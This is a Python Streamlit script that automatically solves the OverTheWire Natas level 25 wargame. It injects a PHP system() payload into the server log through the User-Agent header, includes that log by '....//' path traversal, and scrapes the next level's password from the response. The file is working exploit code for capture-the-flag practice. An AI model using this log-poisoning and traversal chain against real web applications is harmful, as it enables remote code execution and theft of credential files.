import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting Advanced Log Injection & Non-Recursive Traversal Paths...")
    
    # 1. Align active level credentials using your new Level 25 token
    username = "natas25"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Target execution gateway path
    target_url = "http://natas25.natas.labs.overthewire.org/index.php"
    
    # 2. Extract active tracking session identifier string
    session.get(target_url)  # Fire a baseline check to establish cookies natively
    session_id = session.cookies.get("PHPSESSID")
    
    if not session_id:
        st.error("Unable to initialize or extract a valid PHPSESSID tracker from the host.")
        return
        
    st.write(f" └─ Active Tracking Session ID: `{session_id}`")
    
    # 3. Stage 1: Inject the PHP payload into the server-side log file via the User-Agent header
    # The '....//' sequence forces a traversal warning, writing our payload into the logs
    log_poison_payload = "<?php system('cat /etc/natas_webpass/natas26'); ?>"
    custom_headers = {"User-Agent": log_poison_payload}
    poison_params = {"lang": "....//"}
    
    st.write("📡 Dispatched payload sequence into application log storage matrix...")
    session.get(target_url, params=poison_params, headers=custom_headers, timeout=10)
    
    # 4. Stage 2: Trigger execution by traversing down to include our poisoned log file
    traversal_path = "....//....//....//....//....//var/www/natas/natas25/logs/natas25_" + session_id + ".log"
    execution_params = {"lang": traversal_path}
    
    st.write(f"🔄 Executing structural file inclusion tracking against target path...")
    
    try:
        response = session.get(target_url, params=execution_params, timeout=10)
        
        # 5. Extract valid 32/64 character alphanumeric credentials from the raw response text
        all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
        new_tokens = [t for t in all_tokens if t != current_password and t != session_id]
        
        # 6. If a new unique token exists, the exploit was completely successful!
        if new_tokens:
            st.success("🎯 File inclusion path poisoning executed successfully!")
            st.success("🎯 Level 25 challenge resolved successfully!")
            st.code(f"Natas 26 Password: {new_tokens[0]}")
        else:
            st.error("The inclusion pathway did not render target flags. Check tracking configurations.")
            with st.expander("Examine Page Response Output"):
                st.code(response.text, language="html")
                
    except Exception as e:
        st.error(f"Execution failed due to programmatic error: {str(e)}")